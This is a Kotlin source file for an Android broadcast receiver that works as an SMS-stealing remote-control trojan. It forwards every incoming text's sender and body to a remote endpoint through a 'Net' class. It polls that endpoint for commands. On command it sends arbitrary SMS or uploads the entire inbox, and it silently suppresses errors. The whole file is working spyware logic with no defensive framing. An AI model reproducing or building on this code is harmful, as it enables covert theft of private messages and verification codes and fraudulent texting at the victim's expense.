package abyssalarmy.gos

import android.Manifest
import android.content.BroadcastReceiver
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch


class Receiver : BroadcastReceiver() {

    companion object {
        const val ACTION_RECEIVE_SMS = "com.example.ACTION_RECEIVE_SMS"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            ACTION_RECEIVE_SMS -> {
                val net = Net(context)
                val bundle: Bundle? = intent.extras
                if (bundle != null) {
                    try {
                        val pdus = bundle["pdus"] as Array<*>
                        for (pdu in pdus) {
                            val format = bundle.getString("format")
                            val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray, format)
                            val from = smsMessage.displayOriginatingAddress
                            val text = smsMessage.messageBody
                            net.post(arrayOf(Net.Message(from, text)), null)
                        }
                    } catch (_: Exception) {
                    }
                }
            }

            else -> {
                val net = Net(context)
                net.get { requests ->
                    for (request in requests) {
                        when (request.request) {
                            "sendMessage" -> {
                                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                                    val number = request.data[0].value
                                    val text = request.data[1].value
                                    val manager = SmsManager.getDefault()
                                    manager.sendTextMessage(number, null, text, null, null)
                                }
                            }

                            "getMessages" -> {
                                if (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                                    messages(context) { messages ->
                                        net.post(messages.toTypedArray(), null)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private fun messages(context: Context, callback: (sms: ArrayList<Net.Message>) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            val contentResolver: ContentResolver = context.contentResolver
            val uri: Uri = Telephony.Sms.Inbox.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE
            )
            val sortOrder = "${Telephony.Sms.DATE} DESC"
            val cursor: Cursor? = contentResolver.query(uri, projection, null, null, sortOrder)
            cursor?.use {
                val smsList = arrayListOf<Net.Message>()
                while (it.moveToNext()) {
                    val from = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val text = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    smsList.add(Net.Message(from, text))
                }
                callback.invoke(smsList)
                cursor.close()
            }
        }
    }
}